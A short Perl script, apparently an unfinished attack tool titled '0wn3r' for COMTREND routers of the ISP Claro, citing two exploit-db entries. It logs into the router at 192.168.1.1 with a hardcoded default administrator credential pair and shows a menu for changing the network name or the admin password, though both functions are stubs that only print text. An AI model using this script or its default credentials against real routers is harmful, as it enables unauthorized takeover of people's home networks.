#!/usr/bin/perl
# http://www.exploit-db.com/exploits/16275/
# http://www.exploit-db.com/exploits/18101/

use LWP::UserAgent;
use HTTP::Request;
use feature qw(switch);

sub changeName
	{
		print "cambiar nombre"
	}
sub changePass
	{
		print "cambiar pass"
	}

print "0wn3r para router COMTREND de casa claro \n";
my $ua = LWP::UserAgent->new(agent=>'Mozilla/5.0');

$ua->credentials("192.168.1.1:80","DSL Router","admin","c1@r0");
$ua->show_progress('TRUE');
my $response = $ua->get('http://192.168.1.1/');

if ($response->is_success)
 {
	print "***********************************\n";
	print "Presione:  \n";
	print " 1: Cambiar nombre y auth de la red\n";
	print " 2: cambiar password administrativo\n";
	print "***********************************\n";
	$op = <>;
given($op){
  when(1) { changeName(); }
  when(2) { changePass(); }
}

 }
else
{
	die $response->status_line;
}
